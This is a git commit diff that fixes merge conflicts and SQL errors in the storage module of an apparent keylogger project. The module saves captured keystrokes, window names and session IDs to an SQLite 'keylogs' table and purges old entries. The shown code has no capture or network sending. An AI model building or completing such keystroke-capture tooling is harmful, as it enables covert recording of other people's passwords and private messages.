39d300e3601cfd52c1e9c584a1fe3a4e4eacfd5c
Lavoie <jolancailleu@gmail.com>
2026-03-20 15:44:58 +0100

    bug fixed in logger

--- storage/logger.py
+++ storage/logger.py
@@ -1,57 +1,45 @@
 import sqlite3
-<<<<<<< HEAD
 import uuid
 from datetime import datetime
-import listener
-=======
 from listener import flush_buffer, last_timestamp
->>>>>>> 977c092 (minor change on storage)
-#test  
-con = ("keylogs.db")
+DB_PATH = "keylogs.db"
 
 #_____variables globales pour le buffer et le timestamp____________________________________________
-key_data = listener.flush_buffer() #récupère les données du buffer
-ts = listener.last_timestamp
+key_data = flush_buffer()
+ts = last_timestamp
 window = "Window1" #temporaire a remplacer pars variable
-<<<<<<< HEAD
-buffer_empty = getattr(listener, "buffer_empty", False)
+
 SESSION_ID = str(uuid.uuid4())[:8]
-=======
->>>>>>> 977c092 (minor change on storage)
+
 #___________________________________________________________creation de la table_____________________________________________
 def create_table():
-    cur.execute(""" CREATE TABLE IF NOT EXISTS keylogs(
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    timestamp TEXT,
-    key TEXT,
-    window TEXT,
-    session_id DEFAULT TEXT'user_session'          #regarder si code correct pour session_id
-                ')
-    """)
-    con.commit()
+    with sqlite3.connect(DB_PATH) as cur:
+        cur.execute(""" CREATE TABLE IF NOT EXISTS keylogs(
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        timestamp TEXT,
+        key TEXT,
+        window TEXT,
+        session_id TEXT DEFAULT 'user_session'         
+            )
+        """)
+        cur.commit()
 
 #___________________________________________________________ insertion de données____________________________________________
 
 def insert_data(timestamp, key, window, session_id):
-    if buffer_empty:
-        cur.execute("INSERT INTO keylogs(timestamp, key, window, session_id) VALUES (?, ?, ?, ?)", (timestamp, key, window, session_id))
-        con.commit()
-        buffer_empty = False #réinitialise le buffer_empty aprés insertion
-    else:
-        print("Buffer en cours d'execution, données non insérées dans la base de données.")
+    with sqlite3.connect(DB_PATH) as cur:
+            cur.execute("INSERT INTO keylogs(timestamp, key, window, session_id) VALUES (?, ?, ?, ?)", (timestamp, key, window, session_id))
+            cur.commit()
 
 #____________________________________________________________execution du code____________________________________________
 create_table()
 
-<<<<<<< HEAD
-
-=======
->>>>>>> 977c092 (minor change on storage)
 # netoyage
 
 def clear_old(days=7):
-    with sqlite3.connect(con) as conn:
-        conn.execute(
+    with sqlite3.connect(DB_PATH) as con:
+        con.execute(
+            "DELETE FROM keylogs WHERE timestamp < datetime('now', ?)",
             (f"-{days} days",)
         )
-        conn.commit()
+        con.commit()
